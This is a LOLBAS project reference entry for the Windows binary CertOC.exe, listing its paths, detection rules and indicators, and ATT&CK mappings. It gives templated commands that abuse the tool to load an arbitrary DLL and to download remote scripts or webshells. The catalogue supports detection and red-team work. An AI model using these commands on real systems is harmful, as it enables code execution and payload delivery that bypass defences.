---
title: "CertOC.exe"
source: lolbas-project.github.io
source_url: https://lolbas-project.github.io/lolbas/Binaries/Certoc/
fetched_at: 2026-09-20T17:09:26Z
license: unspecified
category: windows
---

Used for installing certificates

## Paths
- c:\windows\system32\certoc.exe
- c:\windows\syswow64\certoc.exe

## Resources
- [https://twitter.com/sblmsrsn/status/1445758411803480072?s=20](https://twitter.com/sblmsrsn/status/1445758411803480072?s=20)
- [https://twitter.com/sblmsrsn/status/1452941226198671363?s=20](https://twitter.com/sblmsrsn/status/1452941226198671363?s=20)

## Acknowledgements
- Ensar Samil ([@sblmsrsn](https://twitter.com/@sblmsrsn))

## Detections
- Sigma: [https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_certoc_load_dll.yml](https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_certoc_load_dll.yml)
- IOC: Process creation with given parameter
- IOC: Unsigned DLL load via certoc.exe
- IOC: Network connection via certoc.exe

## Execute

1. Loads the target DLL file

```
certoc.exe -LoadDLL {PATH_ABSOLUTE:.dll}
```

   - Use case: Execute code within DLL file

   - Privileges required: User

   - Operating systems: Windows Server 2022

   - ATT&CK® technique: T1218

   - Tags: Execute: DLL

2. Downloads text formatted files

```
certoc.exe -GetCACAPS {REMOTEURL:.ps1}
```

   - Use case: Download scripts, webshells etc.

   - Privileges required: User

   - Operating systems: Windows Server 2022

   - ATT&CK® technique: T1105
